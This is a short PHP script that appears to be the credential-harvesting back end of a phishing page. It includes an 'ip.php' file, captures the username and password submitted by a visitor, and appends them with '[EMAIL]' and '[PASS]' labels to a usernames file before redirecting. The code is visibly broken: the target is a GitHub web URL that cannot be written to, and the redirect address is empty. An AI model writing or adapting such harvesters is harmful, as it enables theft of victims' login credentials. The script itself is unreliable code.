<?php
include 'ip.php';

file_put_contents("https://github.com/medha-mishra/medham.unimelb.life/blob/master/usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ');
exit();
